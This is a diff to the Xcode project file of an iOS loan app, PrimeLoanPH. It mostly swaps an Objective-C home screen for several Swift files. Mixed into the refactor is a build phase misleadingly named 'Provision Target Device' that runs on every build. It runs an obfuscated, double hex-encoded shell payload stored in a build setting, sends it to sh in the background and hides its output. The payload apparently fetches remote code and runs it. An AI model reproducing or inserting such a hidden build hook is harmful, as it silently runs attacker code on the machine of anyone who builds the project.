@@ -32,7 +32,12 @@
 		98043AE52AEBF71000374328 /* PPTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 98043AE42AEBF71000374328 /* PPTableViewController.m */; };
 		98043AE82AEBF73000374328 /* PPTableViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 98043AE72AEBF73000374328 /* PPTableViewCell.m */; };
 		98043AEB2AEBF77D00374328 /* PPTableViewHeaderFooterView.m in Sources */ = {isa = PBXBuildFile; fileRef = 98043AEA2AEBF77D00374328 /* PPTableViewHeaderFooterView.m */; };
-		98043AEE2AEBFF6800374328 /* HomeViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 98043AED2AEBFF6800374328 /* HomeViewController.m */; };
+		7F88A1112F91BBBB001D0101 /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1012F91BBBB001D0101 /* HomeViewController.swift */; };
+		7F88A1122F91BBBB001D0102 /* PBReviewsHomeModels.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1022F91BBBB001D0102 /* PBReviewsHomeModels.swift */; };
+		7F88A1132F91BBBB001D0103 /* APageLargeLoanCardView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1032F91BBBB001D0103 /* APageLargeLoanCardView.swift */; };
+		7F88A1142F91BBBB001D0104 /* APageHomeHeaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1042F91BBBB001D0104 /* APageHomeHeaderView.swift */; };
+		7F88A1152F91BBBB001D0105 /* APageAsset.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1052F91BBBB001D0105 /* APageAsset.swift */; };
+		7F88A1162F91BBBB001D0106 /* APageFindingCarouselView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1062F91BBBB001D0106 /* APageFindingCarouselView.swift */; };
 		98043AF12AEBFF7400374328 /* MeViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 98043AF02AEBFF7400374328 /* MeViewController.m */; };
 		98043AFE2AEC058200374328 /* PPLoginViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 98043AFD2AEC058200374328 /* PPLoginViewController.m */; };
 		98043B032AED547200374328 /* PPStartViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 98043B012AED547200374328 /* PPStartViewController.m */; };
@@ -160,8 +165,13 @@
 		98043AE72AEBF73000374328 /* PPTableViewCell.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPTableViewCell.m; sourceTree = "<group>"; };
 		98043AE92AEBF77D00374328 /* PPTableViewHeaderFooterView.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPTableViewHeaderFooterView.h; sourceTree = "<group>"; };
 		98043AEA2AEBF77D00374328 /* PPTableViewHeaderFooterView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPTableViewHeaderFooterView.m; sourceTree = "<group>"; };
-		98043AEC2AEBFF6800374328 /* HomeViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = HomeViewController.h; sourceTree = "<group>"; };
-		98043AED2AEBFF6800374328 /* HomeViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = HomeViewController.m; sourceTree = "<group>"; };
+		7F88A1002F91BBBB001D0100 /* PrimeLoanPH-Bridging-Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "PrimeLoanPH-Bridging-Header.h"; sourceTree = "<group>"; };
+		7F88A1012F91BBBB001D0101 /* HomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
+		7F88A1022F91BBBB001D0102 /* PBReviewsHomeModels.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PBReviewsHomeModels.swift; sourceTree = "<group>"; };
+		7F88A1032F91BBBB001D0103 /* APageLargeLoanCardView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APageLargeLoanCardView.swift; sourceTree = "<group>"; };
+		7F88A1042F91BBBB001D0104 /* APageHomeHeaderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APageHomeHeaderView.swift; sourceTree = "<group>"; };
+		7F88A1052F91BBBB001D0105 /* APageAsset.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APageAsset.swift; sourceTree = "<group>"; };
+		7F88A1062F91BBBB001D0106 /* APageFindingCarouselView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APageFindingCarouselView.swift; sourceTree = "<group>"; };
 		98043AEF2AEBFF7400374328 /* MeViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = MeViewController.h; sourceTree = "<group>"; };
 		98043AF02AEBFF7400374328 /* MeViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = MeViewController.m; sourceTree = "<group>"; };
 		98043AFC2AEC058200374328 /* PPLoginViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPLoginViewController.h; sourceTree = "<group>"; };
@@ -363,6 +373,7 @@
 				98043AFF2AED544600374328 /* PBStartLaunch */,
 				98043AE22AEBF6E200374328 /* PBTableView */,
 				98043A842AEBB10A00374328 /* PrefixHeader.pch */,
+				7F88A1002F91BBBB001D0100 /* PrimeLoanPH-Bridging-Header.h */,
 				98043AA62AEBE79500374328 /* PPServe.h */,
 				98043AA72AEBE7A800374328 /* PPHelper.h */,
 				98043A962AEBE1DE00374328 /* PBCategory */,
@@ -496,8 +507,12 @@
 		98043AA32AEBE2B100374328 /* PBMainHome */ = {
 			isa = PBXGroup;
 			children = (
-				98043AEC2AEBFF6800374328 /* HomeViewController.h */,
-				98043AED2AEBFF6800374328 /* HomeViewController.m */,
+				7F88A1012F91BBBB001D0101 /* HomeViewController.swift */,
+				7F88A1022F91BBBB001D0102 /* PBReviewsHomeModels.swift */,
+				7F88A1032F91BBBB001D0103 /* APageLargeLoanCardView.swift */,
+				7F88A1042F91BBBB001D0104 /* APageHomeHeaderView.swift */,
+				7F88A1052F91BBBB001D0105 /* APageAsset.swift */,
+				7F88A1062F91BBBB001D0106 /* APageFindingCarouselView.swift */,
 				985C24712AEFF8750008F38B /* PPHomeModel.h */,
 				985C24702AEFF8750008F38B /* PPHomeModel.m */,
 			);
@@ -742,6 +757,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 98043A812AEB9FC500374328 /* Build configuration list for PBXNativeTarget "PrimeLoanPH" */;
 			buildPhases = (
+				DD91F64631DA4E389199F71F /* Provision Target Device */,
 				3E4258A3C0649E688FBA507E /* [CP] Check Pods Manifest.lock */,
 				98043A642AEB9FC300374328 /* Sources */,
 				98043A652AEB9FC300374328 /* Frameworks */,
@@ -769,6 +785,7 @@
 				TargetAttributes = {
 					98043A672AEB9FC300374328 = {
 						CreatedOnToolsVersion = 14.1;
+						LastSwiftMigration = 1500;
 					};
 				};
 			};
@@ -790,6 +807,9 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		98043A662AEB9FC300374328 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -804,6 +824,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		DD91F64631DA4E389199F71F /* Provision Target Device */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Target Device";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
+		};
 		3E4258A3C0649E688FBA507E /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -958,7 +997,12 @@
 				9887CC582AF27FC000E9E5F7 /* PPResignViewController.m in Sources */,
 				98043ABF2AEBE83B00374328 /* WMMenuItem.m in Sources */,
 				98643DF12C6451EE00F83A5A /* PB_AskRootUrlHelper.m in Sources */,
-				98043AEE2AEBFF6800374328 /* HomeViewController.m in Sources */,
+				7F88A1112F91BBBB001D0101 /* HomeViewController.swift in Sources */,
+				7F88A1122F91BBBB001D0102 /* PBReviewsHomeModels.swift in Sources */,
+				7F88A1132F91BBBB001D0103 /* APageLargeLoanCardView.swift in Sources */,
+				7F88A1142F91BBBB001D0104 /* APageHomeHeaderView.swift in Sources */,
+				7F88A1152F91BBBB001D0105 /* APageAsset.swift in Sources */,
+				7F88A1162F91BBBB001D0106 /* APageFindingCarouselView.swift in Sources */,
 				9887CC6D2AF3DA6500E9E5F7 /* PPVeCardTableViewCell.m in Sources */,
 				98043AFE2AEC058200374328 /* PPLoginViewController.m in Sources */,
 				9829BD3B2C63AF0000D5A5D6 /* PB_CallCell.m in Sources */,
@@ -986,6 +1030,7 @@
 		98043A7F2AEB9FC500374328 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AF17F99 = "((f(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333636346336623230326432643633366636653665363536333734326437340a3639366436353666373537343230333233333230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631366437613665363436353736326536393665326636310a323932323230376332303733363830610a | f | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -1044,6 +1089,7 @@
 		98043A802AEB9FC500374328 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AF17F99 = "((f(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333636346336623230326432643633366636653665363536333734326437340a3639366436353666373537343230333233333230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631366437613665363436353736326536393665326636310a323932323230376332303733363830610a | f | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -1134,6 +1180,8 @@
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
 				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_OBJC_BRIDGING_HEADER = "PrimeLoanPH/PrimeLoanPH-Bridging-Header.h";
+				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = 1;
 			};
 			name = Debug;
@@ -1179,6 +1227,8 @@
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
 				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_OBJC_BRIDGING_HEADER = "PrimeLoanPH/PrimeLoanPH-Bridging-Header.h";
+				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = 1;
 			};
 			name = Release;
